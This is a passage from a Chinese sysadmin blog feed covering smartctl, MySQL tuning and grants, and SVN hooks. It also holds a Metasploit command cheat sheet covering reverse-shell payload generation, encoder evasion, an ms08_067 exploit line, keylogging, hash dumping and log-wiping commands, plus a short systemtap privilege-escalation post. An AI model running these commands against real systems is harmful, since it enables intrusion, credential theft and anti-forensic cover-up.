<p>=== START OF OFFLINE IMMEDIATE AND SELF-TEST SECTION ===<br>Sending command: “Execute SMART Extended self-test routine immediately in off-line mode”.<br>Drive command “Execute SMART Extended self-test routine immediately in off-line mode” successful.<br>Testing has begun.<br>Please wait 54 minutes for test to complete.<br>Test will complete after Mon Sep 17 03:53:32 2007</p>
<p>Use smartctl -X to abort test.</p>
<p>上面的信息显示54分钟后将完成检查，同时可以使用 smartctl -X 终止检查。终止硬盘检查命令的使用方法是：</p>
<h1 id="smartctl-X-dev-hdb"><a href="#smartctl-X-dev-hdb" class="headerlink" title="smartctl -X /dev/hdb"></a>smartctl -X /dev/hdb</h1><p>smartctl version 5.33 [i686-turbo-linux-gnu] Copyright (C) 2002-4 Bruce Allen<br>Home page is <a href="http://smartmontools.sourceforge.net/" target="_blank" rel="external">http://smartmontools.sourceforge.net/</a></p>
<p>=== START OF OFFLINE IMMEDIATE AND SELF-TEST SECTION ===<br>Sending command: “Abort SMART off-line mode self-test routine”.<br>Self-testing aborted!</p>
<p>5、查看硬盘日志 使用“smartctl -l logtype &lt;device&gt;”可以查看硬盘的日志，日志又分为多种类型，如selftest、error等等。例如查看硬盘检测的日志，如下：</p>
<h1 id="smartctl-l-selftest-dev-hdb"><a href="#smartctl-l-selftest-dev-hdb" class="headerlink" title="smartctl -l selftest /dev/hdb"></a>smartctl -l selftest /dev/hdb</h1><p>smartctl version 5.33 [i686-turbo-linux-gnu] Copyright (C) 2002-4 Bruce Allen<br>Home page is <a href="http://smartmontools.sourceforge.net/" target="_blank" rel="external">http://smartmontools.sourceforge.net/</a></p>
<p>=== START OF READ SMART DATA SECTION ===<br>SMART Self-test log structure revision number 1<br>Num Test_Description Status Remaining LifeTime(hours) LBA_of_first_error</p>
<h1 id="1-Extended-offline-Aborted-by-host-90-4365"><a href="#1-Extended-offline-Aborted-by-host-90-4365" class="headerlink" title="1 Extended offline Aborted by host 90% 4365 -"></a>1 Extended offline Aborted by host 90% 4365 -</h1><h1 id="2-Extended-offline-Completed-without-error-00-4247"><a href="#2-Extended-offline-Completed-without-error-00-4247" class="headerlink" title="2 Extended offline Completed without error 00% 4247 -"></a>2 Extended offline Completed without error 00% 4247 -</h1><h1 id="3-Short-offline-Aborted-by-host-30-4246"><a href="#3-Short-offline-Aborted-by-host-30-4246" class="headerlink" title="3 Short offline Aborted by host 30% 4246 -"></a>3 Short offline Aborted by host 30% 4246 -</h1><h1 id="4-Short-offline-Aborted-by-host-10-4246"><a href="#4-Short-offline-Aborted-by-host-10-4246" class="headerlink" title="4 Short offline Aborted by host 10% 4246 -"></a>4 Short offline Aborted by host 10% 4246 -</h1><h1 id="5-Extended-offline-Completed-without-error-00-4229"><a href="#5-Extended-offline-Completed-without-error-00-4229" class="headerlink" title="5 Extended offline Completed without error 00% 4229 -"></a>5 Extended offline Completed without error 00% 4229 -</h1><p>查看硬盘错误日志：</p>
<h1 id="smartctl-l-error-dev-hdb"><a href="#smartctl-l-error-dev-hdb" class="headerlink" title="smartctl -l error /dev/hdb"></a>smartctl -l error /dev/hdb</h1><p>smartctl version 5.33 [i686-turbo-linux-gnu] Copyright (C) 2002-4 Bruce Allen<br>Home page is <a href="http://smartmontools.sourceforge.net/" target="_blank" rel="external">http://smartmontools.sourceforge.net/</a></p>
<p>=== START OF READ SMART DATA SECTION ===<br>SMART Error Log Version: 1<br>No Errors Logged</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQL慢查询方法学习]]></title>
      <url>/2012/10/10/mysql-e6-85-a2-e6-9f-a5-e8-af-a2-e6-96-b9-e6-b3-95-e5-ad-a6-e4-b9-a0.html</url>
      <content type="html"><![CDATA[<p>以下的文章主要介绍的是MySQL慢查询分析方法，前一段日子，我曾经设置了一次记录在MySQL数据库中对慢于1秒钟的SQL语句进行查询。想起来有几个十分设置的方法，有几个参数的名称死活回忆不起来了，于是重新整理一下，自己做个笔记。<br>对于排查问题找出性能瓶颈来说，最容易发现并解决的问题就是MySQL慢查询以及没有得用索引的查询。<br>OK，开始找出MySQL中执行起来不“爽”的SQL语句吧。<br>MySQL慢查询分析方法一：<br>这个方法我正在用，呵呵，比较喜欢这种即时性的。<br>MySQL5.0以上的版本可以支持将执行比较慢的SQL语句记录下来。</p>
<ol>
<li>MySQL&gt; show variables like ‘long%’;<br>注：这个long_query_time是用来定义慢于多少秒的才算“慢查询”</li>
<li>+—————–+———–+</li>
<li>| Variable_name | Value |</li>
<li>+—————–+———–+</li>
<li>| long_query_time | 10.000000 |</li>
<li>+—————–+———–+</li>
<li>1 row in set (0.00 sec)</li>
<li>MySQL&gt; set long_query_time=1;<br>注： 我设置了1, 也就是执行时间超过1秒的都算慢查询。</li>
<li>Query OK, 0 rows affected (0.00 sec)</li>
<li>MySQL&gt; show variables like ‘slow%’;</li>
<li>+———————+—————+</li>
<li>| Variable_name | Value |</li>
<li>+———————+—————+</li>
<li>| slow_launch_time | 2 |</li>
<li>| slow_query_log | ON |<br>注：是否打开日志记录</li>
<li>| slow_query_log_file | /tmp/slow.log |<br>注： 设置到什么位置</li>
<li>+———————+—————+</li>
<li>3 rows in set (0.00 sec)</li>
<li>MySQL&gt; set global slow_query_log=’ON’<br>注：打开日志记录<br>一旦slow_query_log变量被设置为ON，MySQL会立即开始记录。<br>/etc/my.cnf 里面可以设置上面MySQL全局变量的初始值。</li>
<li>long_query_time=1</li>
<li>slow_query_log_file=/tmp/slow.log<br>MySQL慢查询分析方法二:<br>MySQLdumpslow命令</li>
<li>/path/MySQLdumpslow -s c -t 10 /tmp/slow-log<br>这会输出记录次数最多的10条SQL语句，其中：<br>-s, 是表示按照何种方式排序，c、t、l、r分别是按照记录次数、时间、查询时间、返回的记录数来排序，ac、at、al、ar，表示相应的倒叙；<br>-t, 是top n的意思，即为返回前面多少条的数据；<br>-g, 后边可以写一个正则匹配模式，大小写不敏感的；<br>比如</li>
<li>/path/MySQLdumpslow -s r -t 10 /tmp/slow-log<br>得到返回记录集最多的10个查询。</li>
<li>/path/MySQLdumpslow -s t -t 10 -g “left join” /tmp/slow-log<br>得到按照时间排序的前10条里面含有左连接的查询语句。<br>以上的相关内容就是对MySQL慢查询分析的介绍，望你能有所收获。</li>
</ol>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[metasploit(MSF)终端命令大全]]></title>
      <url>/2012/09/27/metasploitmsf-e7-bb-88-e7-ab-af-e5-91-bd-e4-bb-a4-e5-a4-a7-e5-85-a8.html</url>
      <content type="html"><![CDATA[<p>show exploits</p>
<p>列出metasploit框架中的所有渗透攻击模块。<br>show payloads</p>
<p>列出metasploit框架中的所有攻击载荷。<br>show auxiliary</p>
<p>列出metasploit框架中的所有辅助攻击载荷。<br>search name</p>
<p>查找metasploit框架中所有的渗透攻击和其他模块。<br>info</p>
<p>展示出制定渗透攻击或模块的相关信息。<br>use name</p>
<p>装载一个渗透攻击或模块。<br>LHOST</p>
<p>你本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要是一个公共IP地址，特别为反弹式shell使用。<br>RHOST</p>
<p>远程主机或是目标主机。<br>set function</p>
<p>设置特定的配置参数（EG：设置本地或远程主机参数）。<br>setg function</p>
<p>以全局方式设置特定的配置参数（EG：设置本地或远程主机参数）。<br>show options</p>
<p>列出某个渗透攻击或模块中所有的配置参数。<br>show targets</p>
<p>列出渗透攻击所有支持的目标平台。<br>set target num</p>
<p>指定你所知道的目标的操作系统以及补丁版本类型。<br>set payload name</p>
<p>指定想要使用的攻击载荷。<br>show advanced</p>
<p>列出所有高级配置选项。<br>set autorunscript migrate -f.</p>
<p>在渗透攻击完成后，将自动迁移到另一个进程。<br>check</p>
<p>检测目标是否选定渗透攻击存在相应的安全漏洞。<br>exploit</p>
<p>执行渗透攻击或模块来攻击目标。<br>exploit -j</p>
<p>在计划任务下进行渗透攻击（攻击将在后台进行）。<br>exploit -z</p>
<p>渗透攻击完成后不与回话进行交互。<br>exploit -e encoder</p>
<p>制定使用的攻击载荷编码方式（EG：exploit -e shikata_ga_nai）。<br>exploit -h</p>
<p>列出exploit命令的帮助信息。<br>sessions -l</p>
<p>列出可用的交互会话（在处理多个shell时使用）。<br>sessions -l -v</p>
<p>列出所有可用的交互会话以及详细信息，EG：攻击系统时使用了哪个安全漏洞。<br>sessions -s script</p>
<p>在所有活跃的metasploit会话中运行一个特定的metasploit脚本。<br>sessions -K</p>
<p>杀死所有活跃的交互会话。<br>sessions -c cmd</p>
<p>在所有活跃的metasploit会话上执行一个命令。<br>sessions -u sessionID</p>
<p>升级一个普通的win32 shell到metasploit shell。<br>db_create name</p>
<p>创建一个数据库驱动攻击所要使用的数据库（EG：db_create autopwn）。<br>db_connect name</p>
<p>创建并连接一个数据库驱动攻击所要使用的数据库（EG：db_connect user:passwd@ip/sqlname）。<br>db_namp</p>
<p>利用nmap并把扫描数据存储到数据库中（支持普通的nmap语句，EG：-sT -v -P0）。<br>db_autopwn -h</p>
<p>展示出db_autopwn命令的帮助信息。<br>db_autopwn -p -r -e</p>
<p>对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。<br>db_destroy</p>
<p>删除当前数据库。<br>db_destroy user：<a href="mailto:passwd@host" target="_blank" rel="external">passwd@host</a>：port/database</p>
<p>使用高级选项来删除数据库。<br><strong><em>metasploit命令</em></strong></p>
<p>help</p>
<p>打开meterpreter使用帮助。<br>run scriptname</p>
<p>运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。<br>sysinfo</p>
<p>列出受控主机的系统信息。<br>ls</p>
<p>列出目标主机的文件和文件夹信息。<br>use priv</p>
<p>加载特权提升扩展模块，来扩展metasploit库。<br>ps</p>
<p>显示所有运行的进程以及相关联的用户账户。<br>migrate PID</p>
<p>迁移到一个指定的进程ID（PID号可通过ps命令从主机上获得）。<br>use incognito</p>
<p>加载incognito功能（用来盗窃目标主机的令牌或假冒用户）<br>list_tokens -u</p>
<p>列出目标主机用户的可用令牌。<br>list_tokens -g</p>
<p>列出目标主机用户组的可用令牌。<br>impersonate_token DOMAIN_NAMEUSERNAME</p>
<p>假冒目标主机上的可用令牌。<br>steal_token PID</p>
<p>盗窃给定进程的可用令牌并进行令牌假冒。<br>drop_token</p>
<p>停止假冒当前令牌。<br>getsystem</p>
<p>通过各种攻击向量来提升系统用户权限。<br>execute -f cmd.exe -i</p>
<p>执行cmd.exe命令并进行交互。<br>execute -f cmd.exe -i -t</p>
<p>以所有可用令牌来执行cmd命令并隐藏该进程。<br>rev2self</p>
<p>回到控制目标主机的初始用户账户下。<br>reg command</p>
<p>在目标主机注册表中进行交互，创建，删除，查询等操作。<br>setdesktop number</p>
<p>切换到另一个用户界面（该功能基于那些用户已登录）。<br>screenshot</p>
<p>对目标主机的屏幕进行截图。<br>upload file</p>
<p>向目标主机上传文件。<br>download file</p>
<p>从目标主机下载文件。<br>keyscan_start</p>
<p>针对远程目标主机开启键盘记录功能。<br>keyscan_dump</p>
<p>存储目标主机上捕获的键盘记录。<br>keyscan_stop</p>
<p>停止针对目标主机的键盘记录。<br>getprivs</p>
<p>尽可能多的获取目标主机上的特权。<br>uictl enable keyboard/mouse</p>
<p>接管目标主机的键盘和鼠标。<br>background</p>
<p>将你当前的metasploit shell转为后台执行。<br>hashdump</p>
<p>导出目标主机中的口令哈希值。<br>use sniffer</p>
<p>加载嗅探模式。<br>sniffer_interfaces</p>
<p>列出目标主机所有开放的网络端口。<br>sniffer_dump interfaceID pcapname</p>
<p>在目标主机上启动嗅探。<br>sniffer_start interfaceID packet-buffer</p>
<p>在目标主机上针对特定范围的数据包缓冲区启动嗅探。<br>sniffer_stats interfaceID</p>
<p>获取正在实施嗅探网络接口的统计数据。<br>sniffer_stop interfaceID</p>
<p>停止嗅探。<br>add_user username password -h ip</p>
<p>在远程目标主机上添加一个用户。<br>clearev</p>
<p>清楚目标主机上的日志记录。<br>timestomp</p>
<p>修改文件属性，例如修改文件的创建时间（反取证调查）。<br>reboot</p>
<p>重启目标主机。<br><strong><em>MSFpayload命令</em></strong></p>
<p>msfpayload -h</p>
<p>msfpayload的帮助信息。<br>msfpayload windows/meterpreter/bind_tcp O</p>
<p>列出所有windows/meterpreter/bind_tcp下可用的攻击载荷的配置项（任何攻击载荷都是可用配置的）。<br>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT X &gt; payload.exe</p>
<p>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.exe的windows下可执行程序。<br>msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT R &gt; payload.raw</p>
<p>创建一个metasploit的reverse_tcp攻击载荷，回连到LHOSTip的LPORT，将其保存为名为payload.raw，该文件后面的msffencode中使用。<br>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT C &gt; payload.c</p>
<p>创建一个metasploit的reverse_tcp攻击载荷，导出C格式的shellcode。<br>msfpayload windows/meterpreter/reverse_tcp LPORT=PORT J &gt; payload.java</p>
<p>创建一个metasploit的reverse_tcp攻击载荷，导出成以%u编码方式的javaScript语言字符串。<br><strong><em>msfencode命令</em></strong></p>
<p>mefencode -h</p>
<p>列出msfencode的帮助命令。<br>msfencode -l</p>
<p>列出所有可用的编码器。<br>msfencode -t (c,elf,exe,java,is_le,js_be,perl,raw,ruby,vba,vbs,loop_vbs,asp,war,macho)</p>
<p>显示编码缓冲区的格式。<br>msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe</p>
<p>使用shikata_ga_nai编码器对payload.raw文件进行5编码，然后导出一个名为encoded_payload.exe的文件。<br>msfpayload windows/meterpreter/bind_tcp LPORT=PORT R | msfencode -e x86/_countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe</p>
<p>创建一个经过多种编码格式嵌套编码的攻击载荷。<br>msfencode -i payload.raw BufferRegister=ESI -e x86/alpja_mixed -t c</p>
<p>创建一个纯字母数字的shellcode，由ESI寄存器只想shellcode，以C语言格式输出。<br><strong><em>MSFcli命令</em></strong></p>
<p>msfcli | grep exploit</p>
<p>仅列出渗透攻击模块。<br>msfcli | grep exploit/windows</p>
<p>仅列出与windows相关的渗透攻击模块。<br>msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=PORT RHOST=IP E</p>
<p>对IP发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在PORT端口进行监听。</p>
]]></content>
      
        <categories>
            
            <category> 系统安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> metasploit </tag>
            
            <tag> msf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mysql权限精细化分配]]></title>
      <url>/2012/09/20/mysql-e6-9d-83-e9-99-90-e7-b2-be-e7-bb-86-e5-8c-96-e5-88-86-e9-85-8d.html</url>
      <content type="html"><![CDATA[<p>mysql中可以给你一个用户授予如select,insert,update,delete等其中的一个或者多个权限,主要使用grant命令,用法格式为：&#160; </p>
<p>grant 权限 on 数据库对象 to 用户&#160; </p>
<p><strong>一、grant 普通数据用户，查询、插入、更新、删除 数据库中所有表数据的权利</strong></p>
<p>grant select on testdb.* to common_user@’%’&#160; </p>
<p>grant insert on testdb.* to common_user@’%’&#160; </p>
<p>grant update on testdb.* to common_user@’%’&#160; </p>
<p>grant delete on testdb.* to common_user@’%’&#160; </p>
<p>或者，用一条 mysql 命令来替代：&#160; </p>
<p>grant select, insert, update, delete on testdb.* to common_user@’%’</p>
<p><strong>二、grant 数据库开发人员，创建表、索引、视图、存储过程、函数。。。等权限</strong></p>
<p>grant 创建、修改、删除 mysql 数据表结构权限。&#160; </p>
<p>grant create on testdb.* to developer@’192.168.0.%’;&#160; </p>
<p>grant alter on testdb.* to developer@’192.168.0.%’;&#160; </p>
<p>grant drop on testdb.* to developer@’192.168.0.%’;&#160; </p>
<p>grant 操作 mysql 外键权限。&#160; </p>
<p>grant references on testdb.* to developer@’192.168.0.%’;&#160; </p>
<p>grant 操作 mysql 临时表权限。&#160; </p>
<p>grant create temporary tables on testdb.* to developer@’192.168.0.%’;&#160; </p>
<p>grant 操作 mysql 索引权限。&#160; </p>
<p>grant index on testdb.* to developer@’192.168.0.%’;&#160; </p>
<p>grant 操作 mysql 视图、查看视图源代码 权限。&#160; </p>
<p>grant create view on testdb.* to developer@’192.168.0.%’;&#160; </p>
<p>grant show view on testdb.* to developer@’192.168.0.%’;&#160; </p>
<p>grant 操作 mysql 存储过程、函数 权限。&#160; </p>
<p>grant create routine on testdb.* to developer@’192.168.0.%’; - now, can show procedure status&#160; </p>
<p>grant alter routine on testdb.* to developer@’192.168.0.%’; - now, you can drop a procedure&#160; </p>
<p>grant execute on testdb.* to developer@’192.168.0.%’;</p>
<p><strong>三、grant 普通 dba 管理某个 mysql 数据库的权限</strong></p>
<p>grant all privileges on testdb to dba@’localhost’&#160; </p>
<p>其中，关键字 “privileges” 可以省略。</p>
<p><strong>四、grant 高级 dba 管理 mysql 中所有数据库的权限 </strong></p>
<p>grant all on <em>.</em> to dba@’localhost’</p>
<p><strong>五、mysql grant 权限，分别可以作用在多个层次上&#160; </strong></p>
<p>1. grant 作用在整个 mysql 服务器上：&#160; </p>
<p>grant select on <em>.</em> to dba@localhost; - dba 可以查询 mysql 中所有数据库中的表。&#160; </p>
<p>grant all on <em>.</em> to dba@localhost; - dba 可以管理 mysql 中的所有数据库&#160; </p>
<p>2. grant 作用在单个数据库上：&#160; </p>
<p>grant select on testdb.* to dba@localhost; - dba 可以查询 testdb 中的表。&#160; </p>
<p>3. grant 作用在单个数据表上：&#160; </p>
<p>grant select, insert, update, delete on testdb.orders to dba@localhost;&#160; </p>
<p>4. grant 作用在表中的列上：&#160; </p>
<p>grant select(id, se, rank) on testdb.apache_log to dba@localhost;&#160; </p>
<p>5. grant 作用在存储过程、函数上：&#160; </p>
<p>grant execute on procedure testdb.pr_add to ’dba’@’localhost’&#160; </p>
<p>grant execute on function testdb.fn_add to ’dba’@’localhost’</p>
<p><strong>六、查看 mysql 用户权限&#160; </strong></p>
<p>查看当前用户（自己）权限：&#160; </p>
<p>show grants;&#160; </p>
<p>查看其他 mysql 用户权限：&#160; </p>
<p>show grants for dba@localhost;</p>
<p><strong>七、撤销已经赋予给 mysql 用户权限的权限 </strong></p>
<p>revoke 跟 grant 的语法差不多，只需要把关键字 “to” 换成 “from” 即可：&#160; </p>
<p>grant all on <em>.</em> to dba@localhost;&#160; </p>
<p>revoke all on <em>.</em> from dba@localhost;</p>
<p><strong>八、mysql grant、revoke 用户权限注意事项&#160; </strong></p>
<p>1. grant, revoke 用户权限后，该用户只有重新连接 mysql 数据库，权限才能生效。&#160; </p>
<p>2. 如果想让授权的用户，也可以将这些权限 grant 给其他用户，需要选项 “grant option“&#160; </p>
<p>grant select on testdb.* to dba@localhost with grant option;&#160; </p>
<p>这个特性一般用不到。实际中，数据库权限最好由 dba 来统一管理。</p>
<p>注意：修改完权限以后 一定要刷新服务，或者重启服务</p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Mysql授权 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[普通用户提权root的尝试]]></title>
      <url>/2012/09/20/e6-99-ae-e9-80-9a-e7-94-a8-e6-88-b7-e6-8f-90-e6-9d-83root-e7-9a-84-e5-b0-9d-e8-af-95.html</url>
      <content type="html"><![CDATA[<p>对于centos5.5版本系统的一次由普通用户提权到root权限的尝试</p>
<p><strong>1.查看系统版本</strong></p>
<p><a href="http://img1.51cto.com/attachment/201209/092014994.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201209/092014994.jpg" alt=""></a></p>
<p><strong>2.查看systemtap版本</strong></p>
<p><a href="http://img1.51cto.com/attachment/201209/092216571.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201209/092216571.jpg" alt=""></a></p>
<p><strong>3.由python用户提权到root</strong></p>
<p><a href="http://img1.51cto.com/attachment/201209/092617759.jpg" target="_blank" rel="external"><img src="http://img1.51cto.com/attachment/201209/092617759.jpg" alt=""></a></p>
<p><strong>防御方法：</strong></p>
<p>yum update systemtap到较新版本</p>
<p>本博客原创，已经同步到<a href="http://linuxgeekwolf.blog.51cto.com" target="_blank" rel="external">http://linuxgeekwolf.blog.51cto.com</a>；</p>
]]></content>
      
        <categories>
            
            <category> 系统安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 提权 systemtap入侵 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[svn库自动归档到网站目录和提交svn时强制注释脚本]]></title>
      <url>/2012/09/07/svn-e5-ba-93-e8-87-aa-e5-8a-a8-e5-bd-92-e6-a1-a3-e5-88-b0-e7-bd-91-e7-ab-99-e7-9b-ae-e5-bd-95-e5-92-8c-e6-8f-90-e4-ba-a4svn-e6-97-b6-e5-bc-ba-e5-88-b6-e6-b3-a8-e9-87-8a-e8-84-9a-e6-9c-ac.html</url>
      <content type="html"><![CDATA[<p>&#160;&#160;&#160; linux环境下，这些脚本可以用shell&#160; php&#160; perl&#160; python去写，此次只用shell</p>
<p>&#160;</p>
<p><strong>&lt;hook目录下,保证脚本可执行权限&gt;</strong></p>
<p>前提库名为test库</p>
<p><strong>设置强制提交时注释</strong></p>
<p><strong>pre-commit</strong></p>
<p>#!/bin/bash</p>
<p>REPOS=&quot;$1&quot;</p>
<p>TXN=&quot;$2&quot;</p>
<p>SVNLOOK=/usr/local/bin/svnlook</p>
<p>LOGMSG=<code>$SVNLOOK log -t &amp;quot;$TXN&amp;quot; &amp;quot;$REPOS&amp;quot; | grep &amp;quot;[a-zA-Z0-9]&amp;quot; | wc -c</code></p>
<p>if [ &quot;$LOGMSG&quot; -lt 5 ];#……..5………</p>
<p>then</p>
<p>echo -e &quot;n为了使代码更有可读性，在您提交时必须加上至少五个字符以上的注释！&quot; 1&gt;&amp;2</p>
<p>exit 1</p>
<p>fi</p>
<p><strong>自动归档到网站目录钩子</strong></p>
<p><strong>post-commit</strong></p>
<p>#!/bin/sh</p>
<p>#Description:Update the web while the svn commit!</p>
<p>#Author:GeekWolf</p>
<p>#Email:geekwolf@163.com</p>
<p>REPOS=&quot;$1&quot;</p>
<p>REV=&quot;$2&quot;</p>
<p>mailer.py commit &quot;$REPOS&quot; &quot;$REV&quot; /path/to/mailer.conf</p>
<p>export LC_CTYPE=en_US.UTF-8</p>
<p>/usr/local/bin/svn cleanup /var/www/html/test</p>
<p>/usr/local/bin/svn update /var/www/html/test&#160; –username geekwolf –password geekwolf –no-auth-cache</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> svn注释 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[启动mysql的innodb monitor功能]]></title>
      <url>/2012/09/02/e5-90-af-e5-8a-a8mysql-e7-9a-84innodb-monitor-e5-8a-9f-e8-83-bd.html</url>
      <content type="html"><![CDATA[<p>在使用Innodb做为存储引擎的数据库系统中，可以使用innodb_monitor 来监控数据库的性能，</p>
<p>启动innodb_monitor的方法为 </p>
<p>Create table innodb_monitor (i int) engine=innodb ；</p>
<p>通过建立这个表就启动了innodb_monitor，监控的结果并不会记录到这个表中，而是记录到了mysql的err日志中，如果我们想监控更我的关 于innodb的锁信息还可更进一步的建立表</p>
<p>create table innodb_lock_monitor (i int) engine=innodb 这样在日志中会加入更多的锁信息，</p>
<p>如果要关闭监控只要简单的删除这两个表就可以了.Drop table innodb_monitor; drop table innodb_lock_monitor;</p>
<p>&#160;</p>
<p>&#160;&#160;&#160;&#160;&#160; InnoDB引擎提供了一个monitor，可以通过monitor一窥其内部的一些统计信息，也可以说是了解InnoDB引擎的一个很好的窗口。</p>
<p>我们最熟悉的，应当就是show innodb status命令，可以直接在客户端输出很多的信息。</p>
<p>其实InnoDB monitor一共有四种模式，show innodb status只是其一种模式的直接展现，并且只能交互式开启，无法自动循环捕获信息。另外还有一种适合四种模式的开启方式，则是通过创建一张特殊的 innodb表来开启，开启后会按照固定的时间间隔循环，输出信息到log-error参数指定的错误日志文件中，通过drop对应的表，可以停止 monitor。</p>
<p>四种monitor分别是:</p>
<ul>
<li>innodb_monitor：create table innodb_monitor(x int) engine=innodb;<em>   innodb_lock_monitor：create table innodb_lock_monitor(x int) engine=innodb;</em>   innodb_table_monitor：create table innodb_table_monitor(x int) engine=innodb;*   innodb_tablespace_monitor：create table innodb_tablespace_monitor(x int) engine=innodb;  </li>
</ul>
<p>根据我在5.1.36版本中实际观察到的结果，innodb_monitor/innodb_lock_monitor开启后的执行周期是<strong>16s</strong>（<a href="http://dev.mysql.com/doc/refman/5.1/en/innodb-monitors.html" target="_blank" rel="external">参考手册</a>上说是15s），而innodb_table_monitor/innodb_tablespace_monitor的执行周期是<strong>64s</strong>。开启monitor后因为是持续周期性的运行的，在不需要的时候一定要记得drop相关表来停止monitor。如果在开启monitor的中间服务器有重启，monitor不会自动重启，并且在下次启动monitor之前，必须先执行停止操作。</p>
<p>其中innodb_monitor/innodb_lock_monitor两种监视器的输出结果基本类似，后者会有更多关于锁的信息，而前一 个实际上就是show innodb status。innodb_table_monitor则会将系统中所有innodb的表的一些结构和内部信息输出，而 innodb_tablespace_monitor则输出的是tablespace的信息，注意该monitor输出的只是共享表空间的信息，如果使用 innodb_file_per_table为每个表使用独立的表空间，则这些表空间的信息是不会包含在输出中的。</p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> innodb monitor </tag>
            
            <tag> Mysql </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mysql sending data状态时间花费太大]]></title>
      <url>/2012/08/27/mysql-sending-data-e7-8a-b6-e6-80-81-e6-97-b6-e9-97-b4-e8-8a-b1-e8-b4-b9-e5-a4-aa-e5-a4-a7.html</url>
      <content type="html"><![CDATA[<p>select * from searchzh where modified_date &gt; ‘2009-09-02 14:45:22’;</p>
<p>一条mysql查询语句的性能：sending data 耗时10分钟。。。。</p>
<p>+——————————–+———–+<br>| Status&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | Duration&#160; |<br>+——————————–+———–+<br>| (initialization)&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | 0.000006&#160; |<br>| checking query cache for query | 0.000025&#160; |<br>| checking permissions&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | 0.000008&#160; |<br>| Opening tables&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | 0.000148&#160; |<br>| System lock&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | 0.000008&#160; |<br>| Table lock&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | 0.000008&#160; |<br>| init&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | 0.000007&#160; |<br>| checking permissions&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | 0.000045&#160; |<br>| optimizing&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | 0.000016&#160; |<br>| statistics&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | 0.00027&#160;&#160; |<br>| preparing&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | 0.000034&#160; |<br>| executing&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | 0.000005&#160; |<br>| Sending data&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | 614.25387 |<br>| end&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | 0.000046&#160; |<br>| query end&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | 0.000012&#160; |<br>| freeing items&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | 0.000017&#160; |<br>| closing tables&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | 0.000008&#160; |<br>| logging slow query&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | 0.000054&#160; |<br>+——————————–+———–+<br>18 rows in set (0.01 sec)</p>
